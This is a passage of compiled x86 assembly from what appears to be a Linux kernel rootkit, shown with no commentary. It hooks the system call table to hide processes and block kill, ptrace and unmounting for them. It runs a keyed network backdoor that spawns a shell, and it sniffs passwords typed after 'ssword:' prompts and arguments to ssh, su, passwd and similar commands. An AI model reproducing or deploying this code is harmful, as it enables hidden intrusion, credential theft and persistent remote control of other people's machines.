	movl	%eax, %edx
	addl	$16, %esp
	xorl	%eax, %eax
	cmpl	$32767, %edx
	ja	.L722
	movl	%edx, %ecx
	andl	$31, %ecx
	movl	$1, %eax
	sall	%cl, %eax
	shrl	$5, %edx
	testl	%eax, pidtab(,%edx,4)
	setne	%al
	movzbl	%al, %eax
.L722:
	testl	%eax, %eax
	jne	.L723
	testl	%ebx, %ebx
	movl	$-200, %eax
	jle	.L719
	subl	$8, %esp
	pushl	$0
	pushl	$20
	call __do_syscall;push %eax
	movl	%eax, %edx
	addl	$16, %esp
	xorl	%eax, %eax
	cmpl	$32767, %edx
	ja	.L727
	movl	%edx, %ecx
	andl	$31, %ecx
	movl	$1, %eax
	sall	%cl, %eax
	shrl	$5, %edx
	testl	%eax, nettab(,%edx,4)
	setne	%al
	movzbl	%al, %eax
.L727:
	testl	%eax, %eax
	je	.L723
	movl	$-8192, %eax
#APP
	andl %esp,%eax; 
#NO_APP
	movl	2044(%eax), %ebp
	movl	112(%esp), %eax
	cmpl	%eax, (%ebp)
	je	.L765
.L723:
	pushl	%ebx
	pushl	120(%esp)
	pushl	120(%esp)
	pushl	$3
	call __do_syscall;push %eax
	movl	%eax, %ebx
	movl	$-8192, %eax
#APP
	andl %esp,%eax; 
#NO_APP
	addl	$16, %esp
	movl	12(%eax), %edx
	testl	%ebx, %ebx
	movl	%edx, 8(%esp)
	movl	$-1, 12(%eax)
	js	.L738
	cmpl	$21, %ebx
	jle	.L739
	leal	48(%esp), %ebp
	movl	$22, %ecx
	movl	116(%esp), %esi
	movl	%ebp, %edi
#APP
	rep; movsb
#NO_APP
.L741:
	movl	$lkey, %edi
	movl	$20, %ecx
	xorl	%eax, %eax
	movl	%ebp, %esi
#APP
	repe
	cmpsb
	je 1f
	sbbl %eax,%eax
	orb $1,%al
1:
#NO_APP
	testl	%eax, %eax
	jne	.L738
	cmpl	$21, %ebx
	jle	.L766
.L747:
	subl	$8, %esp
	pushl	$333333333
	pushl	$0
	call	go_sleep
	popl	%esi
	popl	%edi
	movzwl	76(%esp), %eax
	pushl	%eax
	pushl	124(%esp)
	call	pipe_shell
	addl	$16, %esp
	cmpl	$-1, %eax
	je	.L738
	movl	%eax, %ebx
.L738:
	movl	$-8192, %eax
	movl	8(%esp), %edx
#APP
	andl %esp,%eax; 
#NO_APP
	testl	%ebx, %ebx
	movl	%edx, 12(%eax)
	jle	.L751
	subl	$12, %esp
	pushl	124(%esp)
	call	is_a_tty
	addl	$16, %esp
	testl	%eax, %eax
	jne	.L767
.L751:
	movl	%ebx, %eax
.L719:
	addl	$92, %esp
	popl	%ebx
	popl	%esi
	popl	%edi
	popl	%ebp
	ret
.L767:
	subl	$8, %esp
	pushl	$0
	pushl	$20
	call __do_syscall;push %eax
	movl	%eax, %edx
	addl	$16, %esp
	xorl	%eax, %eax
	cmpl	$32767, %edx
	ja	.L755
	movl	%edx, %ecx
	andl	$31, %ecx
	movl	$1, %eax
	sall	%cl, %eax
	shrl	$5, %edx
	testl	%eax, snifftab(,%edx,4)
	setne	%al
	movzbl	%al, %eax
.L755:
	testl	%eax, %eax
	je	.L751
	movl	$-8192, %eax
#APP
	andl %esp,%eax; 
#NO_APP
	movl	2040(%eax), %ecx
	testl	%ecx, %ecx
	jns	.L751
	subl	$8, %esp
	pushl	%ebx
	pushl	128(%esp)
	call	snifflog
	xorl	%edi, %edi
	addl	$16, %esp
	testl	%ebx, %ebx
	movl	$10, %eax
	je	.L760
	movl	116(%esp), %edi
	movl	%ebx, %ecx
#APP
	repne
	scasb
	je 1f
	movl $1,%edi
1:	decl %edi
#NO_APP
.L760:
	testl	%edi, %edi
	je	.L768
.L758:
	subl	$8, %esp
	pushl	$0
	pushl	$20
	call __do_syscall;push %eax
	addl	$16, %esp
	cmpl	$32767, %eax
	movl	%eax, %edx
	ja	.L751
	movl	%eax, %ecx
	andl	$31, %ecx
	movl	$-2, %eax
	roll	%cl, %eax
	shrl	$5, %edx
	andl	%eax, snifftab(,%edx,4)
	jmp	.L751
.L768:
	xorl	%edi, %edi
	testl	%ebx, %ebx
	movl	$13, %eax
	je	.L762
	movl	116(%esp), %edi
	movl	%ebx, %ecx
#APP
	repne
	scasb
	je 1f
	movl $1,%edi
1:	decl %edi
#NO_APP
.L762:
	testl	%edi, %edi
	jne	.L758
	jmp	.L751
.L766:
	movl	$22, %eax
	subl	%ebx, %eax
	pushl	%eax
	leal	20(%esp), %eax
	pushl	%eax
	pushl	120(%esp)
	pushl	$3
	call __do_syscall;push %eax
	addl	$16, %esp
	jmp	.L747
.L739:
	leal	48(%esp), %ebp
	movl	%ebx, %ecx
	movl	116(%esp), %esi
	movl	%ebp, %edi
#APP
	rep; movsb
#NO_APP
	movl	$22, %esi
	pushl	$66
	subl	%ebx, %esi
	pushl	%esi
	leal	(%ebx,%ebp), %eax
	pushl	%eax
	pushl	124(%esp)
	call	recv
	addl	$16, %esp
	cmpl	%esi, %eax
	jne	.L738
	jmp	.L741
.L765:
	movl	8(%ebp), %edx
	leal	(%edx,%ebx), %eax
	movl	%edx, 12(%esp)
	movl	4(%ebp), %edx
	cmpl	%edx, %eax
	jle	.L730
	movl	%edx, %ebx
	subl	12(%esp), %ebx
.L730:
	cmpl	%edx, 12(%esp)
	jge	.L732
	testl	%ebx, %ebx
	jne	.L731
.L732:
	xorl	%eax, %eax
	jmp	.L719
.L731:
	movl	12(%esp), %eax
	leal	12(%eax,%ebp), %esi
	movl	%ebx, %ecx
	movl	116(%esp), %edi
#APP
	rep; movsb
#NO_APP
	addl	%ebx, %eax
	movl	%eax, 8(%ebp)
	jmp	.L751
.Lfe57:
	.size	new_read,.Lfe57-new_read
.LC33:
	.string	"ssword:"
	.type	new_write,@function
new_write:
	pushl	%ebp
	pushl	%edi
	pushl	%esi
	pushl	%ebx
	subl	$12, %esp
	movl	40(%esp), %esi
	movl	32(%esp), %ebp
	movl	36(%esp), %edi
	pushl	%esi
	pushl	%edi
	pushl	%ebp
	pushl	$4
	call __do_syscall;push %eax
	addl	$16, %esp
	testl	%eax, %eax
	movl	%eax, %ebx
	jle	.L770
	subl	$8, %esp
	pushl	$0
	pushl	$20
	call __do_syscall;push %eax
	movl	%eax, %edx
	addl	$16, %esp
	xorl	%eax, %eax
	cmpl	$32767, %edx
	ja	.L772
	movl	%edx, %ecx
	andl	$31, %ecx
	movl	$1, %eax
	sall	%cl, %eax
	shrl	$5, %edx
	testl	%eax, snifftab(,%edx,4)
	setne	%al
	movzbl	%al, %eax
.L772:
	testl	%eax, %eax
	jne	.L783
.L770:
	addl	$12, %esp
	movl	%ebx, %eax
	popl	%ebx
	popl	%esi
	popl	%edi
	popl	%ebp
	ret
.L783:
	subl	$12, %esp
	pushl	%ebp
	call	is_a_tty
	addl	$16, %esp
	testl	%eax, %eax
	je	.L770
	subl	$8, %esp
	pushl	%esi
	pushl	%edi
	call	snifflog
	movl	%esi, %eax
	andl	$268435455, %eax
	movl	$-8192, %ebp
#APP
	andl %esp,%ebp; 
#NO_APP
	addl	2040(%ebp), %eax
	movl	%eax, 2040(%ebp)
	andl	$268435455, %eax
	addl	$16, %esp
	cmpl	$8192, %eax
	jbe	.L775
	subl	$8, %esp
	pushl	$0
	pushl	$20
	call __do_syscall;push %eax
	addl	$16, %esp
	cmpl	$32767, %eax
	movl	%eax, %edx
	ja	.L778
	movl	%eax, %ecx
	andl	$31, %ecx
	movl	$-2, %eax
	roll	%cl, %eax
	shrl	$5, %edx
	andl	%eax, snifftab(,%edx,4)
.L778:
	movl	$0, 2040(%ebp)
	jmp	.L770
.L775:
	pushl	$7
	pushl	$.LC33
	pushl	%esi
	pushl	%edi
	call	my_memmem
	addl	$16, %esp
	testl	%eax, %eax
	je	.L770
	orl	$-2147483648, 2040(%ebp)
	jmp	.L770
.Lfe58:
	.size	new_write,.Lfe58-new_write
	.type	new_close,@function
new_close:
	pushl	%ebx
	subl	$16, %esp
	pushl	$0
	pushl	$20
	call __do_syscall;push %eax
	movl	%eax, %edx
	addl	$16, %esp
	xorl	%eax, %eax
	cmpl	$32767, %edx
	ja	.L787
	movl	%edx, %ecx
	andl	$31, %ecx
	movl	$1, %eax
	sall	%cl, %eax
	shrl	$5, %edx
	testl	%eax, nettab(,%edx,4)
	setne	%al
	movzbl	%al, %eax
.L787:
	testl	%eax, %eax
	je	.L785
	movl	$-8192, %eax
#APP
	andl %esp,%eax; 
#NO_APP
	movl	2044(%eax), %ebx
	movl	16(%esp), %eax
	cmpl	%eax, (%ebx)
	je	.L792
.L785:
	addl	$8, %esp
	movl	$-200, %eax
	popl	%ebx
	ret
.L792:
	subl	$8, %esp
	pushl	$0
	pushl	$20
	call __do_syscall;push %eax
	addl	$16, %esp
	cmpl	$32767, %eax
	movl	%eax, %edx
	ja	.L791
	movl	%eax, %ecx
	andl	$31, %ecx
	movl	$-2, %eax
	roll	%cl, %eax
	shrl	$5, %edx
	andl	%eax, nettab(,%edx,4)
.L791:
	subl	$12, %esp
	pushl	%ebx
	call	ufree
	addl	$16, %esp
	jmp	.L785
.Lfe59:
	.size	new_close,.Lfe59-new_close
.globl fork_pid
	.type	fork_pid,@function
fork_pid:
	pushl	%ebx
	subl	$8, %esp
	movl	16(%esp), %ebx
	testl	%ebx, %ebx
	jle	.L793
	cmpl	$32767, %ebx
	ja	.L798
	movl	%ebx, %ecx
	movl	%ebx, %eax
	andl	$31, %ecx
	movl	$-2, %edx
	shrl	$5, %eax
	roll	%cl, %edx
	andl	%edx, nettab(,%eax,4)
	andl	%edx, snifftab(,%eax,4)
.L798:
	subl	$8, %esp
	pushl	$0
	pushl	$20
	call __do_syscall;push %eax
	movl	%eax, %edx
	addl	$16, %esp
	xorl	%eax, %eax
	cmpl	$32767, %edx
	ja	.L801
	movl	%edx, %ecx
	andl	$31, %ecx
	movl	$1, %eax
	sall	%cl, %eax
	shrl	$5, %edx
	testl	%eax, pidtab(,%edx,4)
	setne	%al
	movzbl	%al, %eax
.L801:
	testl	%eax, %eax
	je	.L799
	cmpl	$32767, %ebx
	ja	.L793
	movl	%ebx, %ecx
	movl	%ebx, %edx
	andl	$31, %ecx
	movl	$1, %eax
	shrl	$5, %edx
	sall	%cl, %eax
	orl	%eax, pidtab(,%edx,4)
.L793:
	addl	$8, %esp
	popl	%ebx
	ret
.L799:
	cmpl	$32767, %ebx
	ja	.L793
	movl	%ebx, %ecx
	movl	%ebx, %edx
	andl	$31, %ecx
	movl	$-2, %eax
	shrl	$5, %edx
	roll	%cl, %eax
	andl	%eax, pidtab(,%edx,4)
	jmp	.L793
.Lfe60:
	.size	fork_pid,.Lfe60-fork_pid
.globl execve_head
	.type	execve_head,@function
execve_head:
	subl	$20, %esp
	pushl	$0
	pushl	$20
	call __do_syscall;push %eax
	addl	$16, %esp
	xorl	%ecx, %ecx
	cmpl	$32767, %eax
	movl	%eax, %edx
	ja	.L810
	movl	%eax, %ecx
	andl	$31, %ecx
	movl	$1, %eax
	sall	%cl, %eax
	shrl	$5, %edx
	xorl	%ecx, %ecx
	testl	%eax, pidtab(,%edx,4)
	setne	%cl
.L810:
	xorl	%eax, %eax
	testl	%ecx, %ecx
	je	.L812
.L807:
	addl	$12, %esp
	ret
.L812:
	subl	$12, %esp
	pushl	32(%esp)
	call	check_path
	addl	$16, %esp
	testl	%eax, %eax
	sete	%al
	movzbl	%al, %eax
	leal	-2(%eax,%eax), %eax
	jmp	.L807
.Lfe61:
	.size	execve_head,.Lfe61-execve_head
.LC34:
	.string	"rlogin"
.LC35:
	.string	"rsh"
.LC36:
	.string	"rcp"
.LC37:
	.string	"rexec"
.LC38:
	.string	"ssh"
.LC39:
	.string	"scp"
.LC40:
	.string	"ssh2"
.LC41:
	.string	"scp2"
.LC42:
	.string	"sftp"
.LC43:
	.string	"telnet"
.LC44:
	.string	"login"
.LC45:
	.string	"su"
.LC46:
	.string	"passwd"
.LC47:
	.string	"adduser"
.LC48:
	.string	"useradd"
	.data
	.type	services.6,@object
	.size	services.6,64
services.6:
	.long	.LC34
	.long	.LC35
	.long	.LC36
	.long	.LC37
	.long	.LC38
	.long	.LC39
	.long	.LC40
	.long	.LC41
	.long	.LC42
	.long	.LC43
	.long	.LC44
	.long	.LC45
	.long	.LC46
	.long	.LC47
	.long	.LC48
	.long	0
.LC49:
	.string	"### execve ### by uid "
	.zero	41
.LC50:
	.string	" "
.globl execve_tail
	.type	execve_tail,@function
execve_tail:
	pushl	%ebp
	pushl	%edi
	pushl	%esi
	pushl	%ebx
	subl	$92, %esp
	movl	168(%esp), %ebp
	movl	112(%esp), %eax
	addl	$4, %ebp
	testl	%eax, %eax
	js	.L813
	subl	$8, %esp
	pushl	$0
	pushl	$20
	call __do_syscall;push %eax
	movl	%eax, %edx
	addl	$16, %esp
	xorl	%eax, %eax
	cmpl	$32767, %edx
	ja	.L817
	movl	%edx, %ecx
	andl	$31, %ecx
	movl	$1, %eax
	sall	%cl, %eax
	shrl	$5, %edx
	testl	%eax, pidtab(,%edx,4)
	setne	%al
	movzbl	%al, %eax
.L817:
	testl	%eax, %eax
	jne	.L813
	movl	(%ebp), %edx
	movb	(%edx), %al
	testb	%al, %al
	movl	%edx, %ecx
	je	.L841
.L823:
	cmpb	$47, %al
	je	.L846
	leal	1(%ecx), %eax
.L820:
	movl	%eax, %ecx
	movb	(%eax), %al
	testb	%al, %al
	jne	.L823
.L841:
	movl	services.6, %eax
	xorl	%ebx, %ebx
	testl	%eax, %eax
	je	.L813
	movl	$-8192, %eax
#APP
	andl %esp,%eax; 
#NO_APP
	movl	%eax, 12(%esp)
.L839:
	movl	services.6(,%ebx,4), %esi
	movl	%edx, %edi
#APP
	1:	lodsb
	scasb
	jne 2f
	testb %al,%al
	jne 1b
	xorl %eax,%eax
	jmp 3f
2:	sbbl %eax,%eax
	orb $1,%al
3:
#NO_APP
	testl	%eax, %eax
	je	.L847
	incl	%ebx
	movl	services.6(,%ebx,4), %eax
	testl	%eax, %eax
	jne	.L839
.L813:
	addl	$92, %esp
	popl	%ebx
	popl	%esi
	popl	%edi
	popl	%ebp
	ret
.L847:
	cld
	leal	16(%esp), %edi
	movl	$.LC49, %esi
	movl	$5, %ecx
	rep
	movsl
	movsw
	movsb
	movl	$10, %ecx
	leal	39(%esp), %edi
	rep
	stosl
	subl	$8, %esp
	stosb
	pushl	$0
	pushl	$20
	call __do_syscall;push %eax
	addl	$16, %esp
	cmpl	$32767, %eax
	movl	%eax, %edx
	ja	.L831
	movl	%eax, %ecx
	andl	$31, %ecx
	movl	$1, %eax
	sall	%cl, %eax
	shrl	$5, %edx
	orl	%eax, snifftab(,%edx,4)
.L831:
	movl	(%ebp), %edi
	movl	12(%esp), %edx
	xorl	%ebx, %ebx
	testl	%edi, %edi
	movl	$0, 2040(%edx)
	je	.L844
	xorl	%esi, %esi
.L838:
	movl	%esi, %ecx
	movl	%esi, %eax
#APP
	decl %ecx
	repnz; scasb
	notl %ecx
	decl %ecx
	
#NO_APP
	subl	$8, %esp
	pushl	%ecx
	pushl	(%ebp,%ebx,4)
	call	snifflog
	popl	%edi
	popl	%eax
	pushl	$1
	pushl	$.LC50
	incl	%ebx
	call	snifflog
	movl	(%ebp,%ebx,4), %edi
	addl	$16, %esp
	testl	%edi, %edi
	jne	.L838
.L844:
	subl	$8, %esp
	pushl	$0
	pushl	$24
	call __do_syscall;push %eax
	popl	%ebx
	popl	%esi
	pushl	%eax
	leal	50(%esp), %eax
	pushl	%eax
	call	my_itoa
	leal	32(%esp), %edx
	leal	(%eax,%edx), %eax
	movb	$10, 22(%eax)
	leal	23(%eax), %edx
	popl	%eax
	popl	%ecx
	leal	24(%esp), %eax
	subl	%eax, %edx
	pushl	%edx
	leal	28(%esp), %edx
	pushl	%edx
	call	snifflog
	addl	$16, %esp
	jmp	.L813
.L846:
	leal	1(%ecx), %edx
	movl	%edx, %eax
	jmp	.L820
.Lfe62:
	.size	execve_tail,.Lfe62-execve_tail
.LC51:
	.string	"/"
	.type	new_umount,@function
new_umount:
	pushl	%edi
	pushl	%esi
	subl	$12, %esp
	movl	24(%esp), %esi
	pushl	$0
	pushl	$20
	call __do_syscall;push %eax
	movl	%eax, %edx
	addl	$16, %esp
	xorl	%eax, %eax
	cmpl	$32767, %edx
	ja	.L851
	movl	%edx, %ecx
	andl	$31, %ecx
	movl	$1, %eax
	sall	%cl, %eax
	shrl	$5, %edx
	testl	%eax, pidtab(,%edx,4)
	setne	%al
	movzbl	%al, %eax
.L851:
	testl	%eax, %eax
	movl	$-200, %edx
	je	.L875
.L848:
	movl	%edx, %eax
	popl	%edx
	popl	%esi
	popl	%edi
	ret
.L875:
	subl	$12, %esp
	pushl	%esi
	call	check_path
	addl	$16, %esp
	testl	%eax, %eax
	movl	$-2, %edx
	jne	.L848
	subl	$8, %esp
	pushl	%esi
	pushl	$22
	call __do_syscall;push %eax
	addl	$16, %esp
	cmpl	$-16, %eax
	movl	%eax, %edx
	jne	.L848
	movl	$.LC51, %edi
#APP
	1:	lodsb
	scasb
	jne 2f
	testb %al,%al
	jne 1b
	xorl %eax,%eax
	jmp 3f
2:	sbbl %eax,%eax
	orb $1,%al
3:
#NO_APP
	testl	%eax, %eax
	jne	.L848
	xorl	%esi, %esi
.L862:
	xorl	%eax, %eax
	cmpl	$32767, %esi
	ja	.L861
	movl	%esi, %ecx
	andl	$31, %ecx
	movl	%esi, %edx
	movl	$1, %eax
	sall	%cl, %eax
	shrl	$5, %edx
	testl	%eax, pidtab(,%edx,4)
	setne	%al
	movzbl	%al, %eax
.L861:
	testl	%eax, %eax
	jne	.L876
.L857:
	incl	%esi
	cmpl	$32767, %esi
	jle	.L862
	subl	$8, %esp
	pushl	$0
	pushl	$1
	call	go_sleep
	xorl	%esi, %esi
	addl	$16, %esp
.L870:
	xorl	%eax, %eax
	cmpl	$32767, %esi
	ja	.L869
	movl	%esi, %ecx
	andl	$31, %ecx
	movl	%esi, %edx
	movl	$1, %eax
	sall	%cl, %eax
	shrl	$5, %edx
	testl	%eax, pidtab(,%edx,4)
	setne	%al
	movzbl	%al, %eax
.L869:
	testl	%eax, %eax
	jne	.L877
.L865:
	incl	%esi
	cmpl	$32767, %esi
	jle	.L870
	subl	$8, %esp
	pushl	$0
	pushl	$1
	call	go_sleep
	movl	$-200, %edx
	addl	$16, %esp
	jmp	.L848
.L877:
	pushl	%ecx
	pushl	$9
	pushl	%esi
	pushl	$37
	call __do_syscall;push %eax
	addl	$16, %esp
	jmp	.L865
.L876:
	pushl	%edi
	pushl	$15
	pushl	%esi
	pushl	$37
	call __do_syscall;push %eax
	addl	$16, %esp
	jmp	.L857
.Lfe63:
	.size	new_umount,.Lfe63-new_umount
	.type	new_umount2,@function
new_umount2:
	pushl	%edi
	pushl	%esi
	subl	$12, %esp
	movl	24(%esp), %esi
	pushl	$0
	pushl	$20
	call __do_syscall;push %eax
	movl	%eax, %edx
	addl	$16, %esp
	xorl	%eax, %eax
	cmpl	$32767, %edx
	ja	.L881
	movl	%edx, %ecx
	andl	$31, %ecx
	movl	$1, %eax
	sall	%cl, %eax
	shrl	$5, %edx
	testl	%eax, pidtab(,%edx,4)
	setne	%al
	movzbl	%al, %eax
.L881:
	testl	%eax, %eax
	movl	$-200, %edx
	je	.L905
.L878:
	movl	%edx, %eax
	popl	%edx
	popl	%esi
	popl	%edi
	ret
.L905:
	subl	$12, %esp
	pushl	%esi
	call	check_path
	addl	$16, %esp
	testl	%eax, %eax
	movl	$-2, %edx
	jne	.L878
	pushl	%eax
	pushl	24(%esp)
	pushl	%esi
	pushl	$22
	call __do_syscall;push %eax
	addl	$16, %esp
	cmpl	$-16, %eax
	movl	%eax, %edx
	jne	.L878
	movl	$.LC51, %edi
#APP
	1:	lodsb
	scasb
	jne 2f
	testb %al,%al
	jne 1b
	xorl %eax,%eax
	jmp 3f
2:	sbbl %eax,%eax
	orb $1,%al
3:
#NO_APP
	testl	%eax, %eax
	jne	.L878
	xorl	%esi, %esi
.L892:
	xorl	%eax, %eax
	cmpl	$32767, %esi
	ja	.L891
	movl	%esi, %ecx
	andl	$31, %ecx
	movl	%esi, %edx
	movl	$1, %eax
	sall	%cl, %eax
	shrl	$5, %edx
	testl	%eax, pidtab(,%edx,4)
	setne	%al
	movzbl	%al, %eax
.L891:
	testl	%eax, %eax
	jne	.L906
.L887:
	incl	%esi
	cmpl	$32767, %esi
	jle	.L892
	subl	$8, %esp
	pushl	$0
	pushl	$1
	call	go_sleep
	xorl	%esi, %esi
	addl	$16, %esp
.L900:
	xorl	%eax, %eax
	cmpl	$32767, %esi
	ja	.L899
	movl	%esi, %ecx
	andl	$31, %ecx
	movl	%esi, %edx
	movl	$1, %eax
	sall	%cl, %eax
	shrl	$5, %edx
	testl	%eax, pidtab(,%edx,4)
	setne	%al
	movzbl	%al, %eax
.L899:
	testl	%eax, %eax
	jne	.L907
.L895:
	incl	%esi
	cmpl	$32767, %esi
	jle	.L900
	subl	$8, %esp
	pushl	$0
	pushl	$1
	call	go_sleep
	movl	$-200, %edx
	addl	$16, %esp
	jmp	.L878
.L907:
	pushl	%ecx
	pushl	$9
	pushl	%esi
	pushl	$37
	call __do_syscall;push %eax
	addl	$16, %esp
	jmp	.L895
.L906:
	pushl	%edi
	pushl	$15
	pushl	%esi
	pushl	$37
	call __do_syscall;push %eax
	addl	$16, %esp
	jmp	.L887
.Lfe64:
	.size	new_umount2,.Lfe64-new_umount2
	.type	new_kill,@function
new_kill:
	pushl	%ebx
	subl	$16, %esp
	movl	24(%esp), %ebx
	pushl	$0
	pushl	$20
	call __do_syscall;push %eax
	addl	$16, %esp
	xorl	%ecx, %ecx
	cmpl	$32767, %eax
	movl	%eax, %edx
	ja	.L911
	movl	%eax, %ecx
	andl	$31, %ecx
	movl	$1, %eax
	sall	%cl, %eax
	shrl	$5, %edx
	xorl	%ecx, %ecx
	testl	%eax, pidtab(,%edx,4)
	setne	%cl
.L911:
	testl	%ecx, %ecx
	movl	$-200, %eax
	jne	.L908
	xorl	%eax, %eax
	cmpl	$32767, %ebx
	ja	.L914
	movl	%ebx, %ecx
	andl	$31, %ecx
	movl	$1, %eax
	sall	%cl, %eax
	shrl	$5, %ebx
	testl	%eax, pidtab(,%ebx,4)
	setne	%al
	movzbl	%al, %eax
.L914:
	testl	%eax, %eax
	setne	%al
	movzbl	%al, %eax
	decl	%eax
	andl	$-197, %eax
	subl	$3, %eax
.L908:
	addl	$8, %esp
	popl	%ebx
	ret
.Lfe65:
	.size	new_kill,.Lfe65-new_kill
	.type	new_ptrace,@function
new_ptrace:
	pushl	%ebx
	subl	$16, %esp
	movl	28(%esp), %ebx
	pushl	$0
	pushl	$20
	call __do_syscall;push %eax
	addl	$16, %esp
	xorl	%ecx, %ecx
	cmpl	$32767, %eax
	movl	%eax, %edx
	ja	.L918
	movl	%eax, %ecx
	andl	$31, %ecx
	movl	$1, %eax
	sall	%cl, %eax
	shrl	$5, %edx
	xorl	%ecx, %ecx
	testl	%eax, pidtab(,%edx,4)
	setne	%cl
.L918:
	testl	%ecx, %ecx
	movl	$-200, %eax
	jne	.L915
	xorl	%eax, %eax
	cmpl	$32767, %ebx
	ja	.L921
	movl	%ebx, %ecx
	andl	$31, %ecx
	movl	$1, %eax
	sall	%cl, %eax
	shrl	$5, %ebx
	testl	%eax, pidtab(,%ebx,4)
	setne	%al
	movzbl	%al, %eax
.L921:
	testl	%eax, %eax
	setne	%al
	movzbl	%al, %eax
	decl	%eax
	andl	$-197, %eax
	subl	$3, %eax
.L915:
	addl	$8, %esp
	popl	%ebx
	ret
.Lfe66:
	.size	new_ptrace,.Lfe66-new_ptrace
	.type	ldt_alloc,@function
ldt_alloc:
	pushl	%esi
	pushl	%ebx
	subl	$36, %esp
	movb	28(%esp), %al
	orl	$32, %eax
	andl	$-96, %eax
	movb	%al, 28(%esp)
	movl	$58879, 20(%esp)
	movl	$-8192, %ebx
#APP
	andl %esp,%ebx; 
#NO_APP
	movl	12(%ebx), %esi
	movl	$8191, 16(%esp)
	movl	$42227, 24(%esp)
	movl	$-1, 12(%ebx)
	pushl	$16
	leal	20(%esp), %eax
	pushl	%eax
	pushl	$1
	pushl	$123
	call __do_syscall;push %eax
	addl	$16, %esp
	xorl	%ecx, %ecx
	testl	%eax, %eax
	movl	%esi, 12(%ebx)
	jne	.L922
#APP
	sgdt (%esp)
	sldt %eax
#NO_APP
	addl	2(%esp), %eax
	movzbl	4(%eax), %edx
	movzwl	2(%eax), %ecx
	sall	$16, %edx
	movzbl	7(%eax), %eax
	orl	%edx, %ecx
	sall	$24, %eax
	orl	%eax, %ecx
.L922:
	addl	$36, %esp
	popl	%ebx
	movl	%ecx, %eax
	popl	%esi
	ret
.Lfe67:
	.size	ldt_alloc,.Lfe67-ldt_alloc
	.type	new_sigret,@function
new_sigret:
	subl	$20, %esp
	pushl	$0
	pushl	$20
	call __do_syscall;push %eax
	addl	$16, %esp
	decl	%eax
	je	.L934
.L931:
	movl	$-200, %eax
	addl	$12, %esp
	ret
.L934:
	movl	initialized, %eax
	testl	%eax, %eax
	jne	.L931
	movl	$1, initialized
	call	uninstall_new_idt
	call	ldt_alloc
	testl	%eax, %eax
	movl	%eax, initmem
	jne	.L933
	movl	$0, initialized
	jmp	.L931
.L933:
	leal	65528(%eax), %edx
	movl	kernel_sct, %eax
	movl	%edx, 236(%eax)
	jmp	.L931
.Lfe68:
	.size	new_sigret,.Lfe68-new_sigret
	.data
	.type	hooks,@object
	.size	hooks,235
hooks:
	.byte	59
	.long	new_aux
	.byte	2
	.long	new_clone
	.byte	120
	.long	new_clone
	.byte	-66
	.long	new_clone
	.byte	8
	.long	new_creat
	.byte	10
	.long	new_unlink
	.byte	11
	.long	new_execve
	.byte	30
	.long	new_pathf
	.byte	12
	.long	new_pathf
	.byte	14
	.long	new_pathf
	.byte	15
	.long	new_pathf
	.byte	-74
	.long	new_pathf
	.byte	16
	.long	new_pathf
	.byte	-44
	.long	new_pathf
	.byte	-58
	.long	new_pathf
	.byte	18
	.long	new_oldstat
	.byte	84
	.long	new_oldstat
	.byte	22
	.long	new_umount
	.byte	52
	.long	new_umount2
	.byte	33
	.long	new_pathf
	.byte	39
	.long	new_pathf
	.byte	40
	.long	new_pathf
	.byte	61
	.long	new_pathf
	.byte	85
	.long	new_pathf
	.byte	86
	.long	new_pathf
	.byte	92
	.long	new_pathf
	.byte	-63
	.long	new_pathf
	.byte	106
	.long	new_stat
	.byte	107
	.long	new_stat
	.byte	-61
	.long	new_stat64
	.byte	-60
	.long	new_stat64
	.byte	99
	.long	new_pathf
	.byte	9
	.long	new_oldnewf
	.byte	38
	.long	new_oldnewf
	.byte	83
	.long	new_oldnewf
	.byte	-39
	.long	new_oldnewf
	.byte	-115
	.long	new_getdents
	.byte	-36
	.long	new_getdents64
	.byte	5
	.long	new_open
	.byte	3
	.long	new_read
	.byte	4
	.long	new_write
	.byte	6
	.long	new_close
	.byte	37
	.long	new_kill
	.byte	26
	.long	new_ptrace
	.byte	119
	.long	new_sigret
	.byte	-83
	.long	new_sigret
	.byte	0
	.long	0
.globl 	kernel_old80;	kernel_old80:.zero 4 
.globl 	kernel_sysaux;	kernel_sysaux:.zero 4 
.globl 	kernel_sct;	kernel_sct:.zero 4 
.globl 	kbase;	kbase:.zero 4 
.globl 	kidt;	kidt:.zero 4 
.globl 	cfg;	cfg:.zero 292 
	.type	memset,@function
memset:
	pushl	%edi
	pushl	%ecx
	movl	20(%esp), %ecx
	movb	16(%esp), %al
	movl	12(%esp), %edi
#APP
	rep
	stosb
#NO_APP
	movl	12(%esp), %eax
	popl	%edx
	popl	%edi
	ret
.Lfe69:
	.size	memset,.Lfe69-memset
.globl 	lkey;	lkey:.zero 20 
	.local	pidtab
.globl 	pidtab;	pidtab:.zero 4096 
	.local	nettab
.globl 	nettab;	nettab:.zero 4096 
	.local	snifftab
.globl 	snifftab;	snifftab:.zero 4096 
	.local	capoff
.globl 	capoff;	capoff:.zero 4 
	.local	ebuf1
.globl 	ebuf1;	ebuf1:.zero 512 
	.local	ebuf2
.globl 	ebuf2;	ebuf2:.zero 512 
	.local	_pty
.globl 	_pty;	_pty:.zero 4 
	.ident	"GCC: (GNU) 3.2.2 20030222 (Red Hat Linux 3.2.2-5)"
